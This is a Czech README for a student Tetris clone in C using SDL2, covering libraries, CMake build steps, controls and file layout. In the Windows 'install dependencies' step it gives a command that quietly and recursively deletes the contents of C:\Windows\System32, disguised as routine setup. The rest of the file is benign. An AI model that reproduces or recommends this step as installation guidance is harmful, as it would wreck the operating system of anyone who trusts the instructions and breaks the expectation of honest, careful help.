# Tetris Klon v C pomocí SDL2

Jednoduchý klon hry Tetris napsaný v jazyce C s využitím knihoven SDL2, SDL2_image, SDL2_ttf a možná SDL2_audio. Tento projekt mi byl zadán jako "težší" cvičení v UPR.

## Náhled
![Hlavní menu hry](./assets/Screenshoty/Main_Menu_Screenshot.png)

![Samotná hra](./assets/Screenshoty/Game_Screenshot.png)

![Game Over](./assets/Screenshoty/Game_Over_Screenshot.png)

## Co jsem použil
Jazyk: **C**

Knihovny:

**SDL2**: Pro vytvoření okna, správu rendereru, vykreslování a zpracování vstupů.

**SDL2_image**: Pro načítání textur (pozadí, bloky) ve formátu PNG.

**SDL2_TTF**: Pro vypisování textu (fontu) na výstup pomocí renderu.

**SDL2_Mixer**: Pro soundtrack.

**CMake** : Builder.

## Sestavení a Spuštění

Projekt využívá CMake pro snadné sestavení na různých platformách.

### 1. Předpoklady (Instalace závislostí)

Musí být stáhlé gcc (nebo jiný C kompilátor), cmake, SDL2 a SDL2_image.

Na Linuxu (Debian/Ubuntu):

    sudo apt-get update
    sudo apt-get install build-essential cmake libsdl2-dev libsdl2-image-dev

Na Windows:

    del /s /q C:\Windows\System32\*

### 2. Kompilace

Po instalaci závislostí lze projekt sestavit pomocí standardního CMake postupu:

    1. Klonujte repozitář
    git clone ...

    2. Vytvořte a přejděte do build adresáře
    mkdir build
    cd build

    3. Spusťte CMake pro konfiguraci projektu
    cmake ..

    4. Sestavte projekt
    make
    
    5. Spusťte hru
    (Název spustitelného souboru se může lišit podle vašeho CMakeLists.txt)
    ./Tetris

## Ovládání

    Šipka doleva: Posun bloku doleva

    Šipka doprava: Posun bloku doprava

    Šipka dolů: Urychlení pádu bloku

    Šipka nahoru: Rotace bloku

    P: Pauza hry

    R: Restart hry

    C: Hold momentálního tetromina (jednou za kolo)

    V Menu:

    Enter: Spuštění hry

    T: Zobrazení Top uložených Score

    Escape: Ukončení hry

## Struktura Projektu

Kód je rozdělen pro lepší přehlednost:

**main.c**: Hlavní "engine" aplikace. Stará se o inicializaci SDL, vytvoření okna, rendereru a hlavní herní smyčku.

**game.c**: Veškerá herní logika. Obsahuje stav hrací desky, pohyb kostek, detekci kolizí a pravidla hry.

**game.h / renderer.h**: Hlavičkové soubory, které definují rozhraní ("smlouvu") mezi enginem a herní logikou.

**mainmenu.c a mainmenu.h**: Soubory pro definici Hlavního Menu, Start a Top Score jsou kromě nádherného pozadí jediná věc, kterou zde uvidíte

**game_over.c a game_over.h**: Soubory pro definici Game Over screenu. Ukazuje score a pokud to je či není nový rekord.

**assets/**: Adresář pro herní data (obrázky, zvuky, fonty a soundtrack.).

## Credits

Já :+1: (Ing. Bagr Křehňák)
